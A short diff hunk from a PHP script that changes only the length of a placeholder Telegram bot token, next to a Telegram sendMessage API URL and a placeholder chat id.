@@ -35,7 +35,7 @@ foreach ($variables_to_record as $variable) {
     }
 }
 
-$token = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
+$token = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
 $telegram_api_url = "https://api.telegram.org/bot$token/sendMessage";
 $id = "XXXXXXXXXXXXXXXXX";
 
